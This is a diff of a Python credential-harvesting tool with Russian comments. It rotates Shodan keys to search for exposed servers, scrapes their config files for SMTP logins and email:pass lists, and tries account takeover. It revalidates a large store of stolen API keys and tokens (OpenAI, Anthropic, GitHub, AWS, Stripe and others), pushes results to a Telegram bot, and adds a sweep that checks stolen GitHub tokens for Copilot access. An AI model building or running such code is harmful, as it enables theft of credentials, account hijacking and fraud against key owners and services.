+        _pool = Shodan()._alive_pool(Shodan()._key_pool())
+    except Exception:
+        _pool = [CFG["shodan_key"]] if CFG.get("shodan_key") else []
+    if not _pool:
+        return []
     matches = []
     for dork in dorks:
         for page in (1, 2, 3):
-            try:
-                r = requests.get(
-                    "https://api.shodan.io/shodan/host/search",
-                    params={"key": CFG["shodan_key"], "query": dork, "page": page},
-                    timeout=(10, 30),
-                    verify=False,
-                )
-                if r.status_code != 200:
+            got = False
+            for sk in _pool:
+                try:
+                    r = requests.get(
+                        "https://api.shodan.io/shodan/host/search",
+                        params={"key": sk, "query": dork, "page": page},
+                        timeout=(10, 30),
+                        verify=False,
+                    )
+                    if r.status_code == 429:
+                        time.sleep(3)
+                        continue  # следующий ключ
+                    if r.status_code != 200:
+                        break  # 402/401: кредиты кончились у всех — стоп дорк
+                    pm = r.json().get("matches") or []
+                    if pm:
+                        matches.extend(pm)
+                        got = True
                     break
-                pm = r.json().get("matches") or []
-                if not pm:
+                except Exception:
                     break
-                matches.extend(pm)
-            except Exception:
+            if not got:
                 break
     if not matches:
         return []
@@ -12699,6 +15676,7 @@ def env_smtp_sweep(cycle=0):
     results = []
     _seen_keys = load_seen()  # один раз за sweep
     _sweep_done = set()  # внутри-sweep дедуп (не персистим — мёртвые ретраятся)
+    _persist = set()  # хэши РАБОЧИХ находок — в seen в конце (анти-дубль постинг)
     _lock = threading.Lock()
 
     def process_host(m):
@@ -12709,7 +15687,6 @@ def env_smtp_sweep(cycle=0):
         with _lock:
             if host in seen_hosts:
                 return []
-            seen_hosts[host] = time.time()
         # путь из краула (там лежит конфиг)
         path = ((m.get("http") or {}).get("path") or "/").split("?")[0]
         scheme = "https" if (m.get("ssl") or port in (443, 8443)) else "http"
@@ -12722,6 +15699,10 @@ def env_smtp_sweep(cycle=0):
             body = rr.text[:200000]
         except Exception:
             return []
+        # seen ставим ПОСЛЕ успешного фетча (было: до — таймаут навсегда
+        # хоронил хост, хотя конфиг мог появиться позже)
+        with _lock:
+            seen_hosts[host] = time.time()
         pairs = _ENV_SMTP_RE.findall(body)
         # + комблист-формат: email:pass / email|pass построчно (для txt-файлов)
         if len(pairs) < 3:
@@ -12765,6 +15746,8 @@ def env_smtp_sweep(cycle=0):
                 continue
             log("  📧 ENV-SMTP: %s @ %s" % (email_addr, host))
             store(v)
+            with _lock:
+                _persist.add(h)
             out.append(v)
             # 📨 МГНОВЕННО в TG: нашёл ящик -> сразу в бота
             post_finding_now(v)
@@ -12777,10 +15760,16 @@ def env_smtp_sweep(cycle=0):
                 log("  🎯 env-smtp ATO: %s -> сессия!" % email_addr)
         return out
 
-    # 🚀 параллельный фетч хостов: 80 за проход вместо 40 последовательно
+    # 🚀 параллельный фетч хостов: РОТИРУЕМОЕ окно 80 (было matches[:80] =
+    # вечно первые 80 от дорка #1, остальные дорки никогда не обрабатывались)
+    if len(matches) > 80:
+        _w0 = (cycle * 80) % len(matches)
+        _window = (matches[_w0:] + matches[:_w0])[:80]
+    else:
+        _window = matches
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
-            for res in ex.map(process_host, matches[:80]):
+            for res in ex.map(process_host, _window):
                 if res:
                     results.extend(res)
     except Exception as e:
@@ -12796,7 +15785,85 @@ def env_smtp_sweep(cycle=0):
         )
     except Exception:
         pass
+    # персистим хэши рабочих находок в seen (было: не сохранялись -> после
+    # рестарта те же креды валидились заново и летели в TG повторно)
+    if _persist:
+        try:
+            _sn = load_seen()
+            _sn |= _persist
+            save_seen(_sn)
+        except Exception:
+            pass
     return results
+
+
+# Теги, которые НЕЛЬЗЯ перепроверять chat-пробой: у них не LLM-эндпоинт,
+# quick_chat против их base бессмысленен (404/401 шум), а запись может
+# ложно умереть (401 от чужого сервера != мёртвая сессия). Их валидаторы
+# живут в validate_*; речек тут их просто не трогает.
+NON_LLM_TAGS = {
+    "jwt",
+    "websess",
+    "gcookie",
+    "tg-bot",
+    "email-cred",
+    "db-dsn",
+    "github",
+    "github-token",
+    "gitlab",
+    "slack",
+    "stripe",
+    "discord",
+    "sendgrid",
+    "notion",
+    "airtable",
+    "aws",
+    "google-refresh",
+    "codex-web",
+    "kimi-web",
+    "openai-web",
+    "anthropic-web",
+    "tg-export",
+    "laravel-appkey",
+    "gocspx",
+    "cloudflare",
+    "npm",
+    "linear",
+    "figma",
+    "twilio",
+    "shopify",
+    "sentry",
+    "roblox",
+    "steam",
+    "instagram",
+    "x-session",
+    "cursor-web",
+    "supabase-auth",
+    # аудит 2026-09-10: recheck chat-пробами УБИВАЛ эти записи (их валидаторы
+    # не OpenAI-chat): baseten требует Api-Key заголовок, ort01 — это
+    # refresh_token (401 на x-api-key -> ложная смерть), admin01 — не чат,
+    # codex — chatgpt backend-api, google/replicate — не chat-эндпоинты.
+    "baseten",
+    "anthropic-refresh",
+    "anthropic-admin",
+    "codex",
+    "google",
+    "replicate",
+    "supabase",
+    # аудит-волна 2: у этих свои валидаторы, chat-проба recheck'а — чистый
+    # прожиг (у elevenlabs/jina/voyage вообще нет chat-эндпоинта)
+    "elevenlabs",
+    "huggingface",
+    "perplexity",
+    "jina",
+    "voyage",
+}
+# working-ключи перепроверяем только когда протухли (20ч): каждый quick_chat
+# жжёт квоту самой находки, а свежепроверенный ключ не успевает умереть.
+RECHECK_WORKING_STALE = 20 * 3600
+# REVIVED-нотификейшн не чаще раза в 24ч на ключ: modelscope/sensenova с
+# суточной квотой флапают working<->no_balance каждый день = TG-спам.
+REVIVE_NOTIFY_COOLDOWN = 24 * 3600
 
 
 def cmd_recheck():
@@ -12804,8 +15871,41 @@ def cmd_recheck():
     if not os.path.exists(STORE_PATH):
         log("store пуст")
         return
-    recs = [json.loads(l) for l in open(STORE_PATH, encoding="utf-8") if l.strip()]
-    log("ревалидация %d записей (боевой вызов)..." % len(recs))
+    recs = []
+    with open(STORE_PATH, encoding="utf-8") as _f:
+        for l in _f:
+            if not l.strip():
+                continue
+            try:
+                recs.append(json.loads(l))
+            except Exception:
+                continue  # битая строка не роняет весь речек
+    # сплит: не-LLM теги и свежие working не дёргаем вообще
+    now0 = time.time()
+    skipped, to_check = [], []
+    for v in recs:
+        if v.get("tag") in NON_LLM_TAGS:
+            skipped.append(v)
+            continue
+        # open-infra записи с синтетическим ключом open://addr — это
+        # ОТКРЫТЫЕ ЭНДПОИНТЫ (ключей нет), chat-проба их ломает/флапает
+        # статус. Реальные sk- мастер-ключи того же тега пробуем.
+        if v.get("tag") == "open-infra" and str(v.get("key", "")).startswith("open://"):
+            skipped.append(v)
+            continue
+        if (
+            v.get("status") == "working"
+            and now0 - (v.get("_last_recheck") or v.get("ts") or 0)
+            < RECHECK_WORKING_STALE
+        ):
+            skipped.append(v)
+            continue
+        to_check.append(v)
+    recs = to_check
+    log(
+        "ревалидация %d записей (боевой вызов; %d пропущено: не-LLM/свежие)..."
+        % (len(recs), len(skipped))
+    )
 
     def recheck_one(v):
         base = v.get("base", "")
@@ -12886,6 +15986,7 @@ def cmd_recheck():
                 continue
             if state == "working":
                 # КЛЮЧ РАБОТАЕТ
+                v["_last_recheck"] = time.time()
                 if old_status in ("no_balance", "listed_only"):
                     # РЕВАЙВАЛ! ключ пополнили
                     v["status"] = "working"
@@ -12893,27 +15994,35 @@ def cmd_recheck():
                     sw = set(v.get("stars_working", []))
                     sw.add(test_model)
                     v["stars_working"] = sorted(sw)
+                    # анти-флап: TG не чаще раза в 24ч на ключ (дневные квоты
+                    # modelscope/sensenova иначе спамят REVIVED каждый цикл)
+                    last_n = v.get("_revive_notified_ts") or 0
+                    quiet = (time.time() - last_n) < REVIVE_NOTIFY_COOLDOWN
                     log(
-                        "  💚 REVIVED %s @ %s (%s) — был %s!"
+                        "  💚 REVIVED %s @ %s (%s) — был %s!%s"
                         % (
                             v["key"][:16] + "…",
                             v.get("base", ""),
                             test_model,
                             old_status,
+                            " (тихо: cooldown)" if quiet else "",
                         )
                     )
-                    try:
-                        post_telegram(
-                            "💚 КЛЮЧ ОЖИЛ (был no_balance)!\n<code>%s</code>\n🌐 %s\n✅ %s"
-                            % (v["key"], v.get("base", ""), test_model)
-                        )
-                    except Exception:
-                        pass
+                    if not quiet:
+                        try:
+                            post_telegram(
+                                "💚 КЛЮЧ ОЖИЛ (был no_balance)!\n<code>%s</code>\n🌐 %s\n✅ %s"
+                                % (v["key"], v.get("base", ""), test_model)
+                            )
+                            v["_revive_notified_ts"] = time.time()
+                        except Exception:
+                            pass
                 else:
                     v["status"] = "working"
                 alive.append(v)
             elif state == "no_balance":
                 v["status"] = "no_balance"
+                v["_last_recheck"] = time.time()
                 alive.append(v)
             elif state == "invalid_key" or (
                 state in ("not_found", "unknown", "net") and bad_base(v.get("base", ""))
@@ -12923,7 +16032,11 @@ def cmd_recheck():
                 log("  💀 DEAD %s @ %s" % (v["key"][:16] + "…", v.get("base", "")))
             else:
                 # timeout/err — не убиваем, оставляем как было
+                # (_last_recheck НЕ ставим: сеть шумнула, ключ не проверен)
                 alive.append(v)
+
+    # пропущенные (не-LLM теги / свежие working) — возвращаем в живые без проб
+    alive.extend(skipped)
 
     # merge-safe запись: под LOCK перечитываем файл, обновляем записи по
     # (key, base), строки добавленные store() во время валидации — сохраняем
@@ -12932,11 +16045,19 @@ def cmd_recheck():
 
     with LOCK:
         try:
-            current = [
-                json.loads(l) for l in open(STORE_PATH, encoding="utf-8") if l.strip()
-            ]
+            current = []
+            with open(STORE_PATH, encoding="utf-8") as _f:
+                for l in _f:
+                    if l.strip():
+                        try:
+                            current.append(json.loads(l))
+                        except Exception:
+                            continue
         except Exception:
-            current = list(alive)
+            # merge-перечитка упала — АБОРТИМ перезапись (было: молча
+            # терялись все записи, добавленные между load и merge)
+            log("  ⚠️ recheck: merge re-read failed — стор НЕ трогаем")
+            return
         by_kb = {}
         for c in current:
             by_kb[_kb(c)] = c
@@ -12945,9 +16066,41 @@ def cmd_recheck():
                 by_kb[_kb(v)] = v  # обновлённая запись побеждает
         for d in dead:
             by_kb.pop(_kb(d), None)
-        with open(STORE_PATH, "w", encoding="utf-8") as f:
+        # АТОМАРНАЯ перезапись: tmp + os.replace + .bak (было: голое open("w")
+        # — крэш посреди перезаписи = стор обнулён навсегда)
+        try:
+            if os.path.exists(STORE_PATH):
+                _bk = STORE_PATH + ".bak"
+                if os.path.exists(_bk):
+                    os.remove(_bk)
+                os.replace(STORE_PATH, _bk)
+        except Exception:
+            pass
+        _tmp = STORE_PATH + ".tmp"
+        with open(_tmp, "w", encoding="utf-8") as f:
             for c in by_kb.values():
                 f.write(json.dumps(c, ensure_ascii=False) + "\n")
+        os.replace(_tmp, STORE_PATH)
+        # синк self-dedup индекса: мёртвые khash освобождаем (иначе повторная
+        # находка того же ключа позже молча блокировалась бы store())
+        global _STORE_KHASH
+        if _STORE_KHASH is not None:
+            for d in dead:
+                _STORE_KHASH.discard(khash(d.get("key", ""), d.get("base")))
+    # SEEN-освобождение: мёртвый khash в seen.json блокировал ПОВТОРНУЮ
+    # находку навсегда (ключ оживили -> источник приносит снова -> seen
+    # молча глотает). Убираем мёртвых из seen-файла: оживший ключ
+    # ревалидируется как новый.
+    if dead:
+        try:
+            _seen = load_seen()
+            _before = len(_seen)
+            for d in dead:
+                _seen.discard(khash(d.get("key", ""), d.get("base")))
+            if len(_seen) != _before:
+                save_seen(_seen)
+        except Exception:
+            pass
     with open(DEAD_PATH, "a", encoding="utf-8") as f:
         for v in dead:
             f.write(json.dumps(v, ensure_ascii=False) + "\n")
@@ -13153,6 +16306,16 @@ def main():
         log("   автодроп находок: %s" % DESKTOP_DROP)
         log("   TG-постинг: включён (бот ждёт /start для захвата chat_id)")
         log("   ревалидация стора: каждый 4-й цикл")
+        # транспорт-проба: видно в логе, жив ли прокси-канал (10809)
+        try:
+            for _nm, _ss in (("proxy", PROXY), ("direct", DIRECT)):
+                try:
+                    _r = _ss.get("https://api.ipify.org", timeout=5, verify=False)
+                    log("   транспорт %s: OK (exit %s)" % (_nm, _r.text.strip()))
+                except Exception as _e:
+                    log("   транспорт %s: DEAD (%s)" % (_nm, type(_e).__name__))
+        except Exception:
+            pass
         cycle = 0
         while True:
             cycle += 1
@@ -13196,6 +16359,15 @@ def main():
                 opendb_sweep(cycle)
             except Exception as e:
                 log("opendb sweep err: %s" % e)
+            # COPILOT свип: github-токены из стора -> Copilot-подписка?
+            # АУДИТ-фикс: функция была написана, но НИГДЕ не вызывалась —
+            # весь пласт Copilot-сабов лежал мёртвым кодом
+            try:
+                _cop = copilot_sweep(cycle)
+                if _cop:
+                    log("  🤖 copilot-sweep: %d находок" % len(_cop))
+            except Exception as e:
+                log("copilot sweep err: %s" % e)
             # VAULT SYNC + FAVICON PIVOT: каждый 4-й цикл
             if cycle % 4 == 0:
                 try:
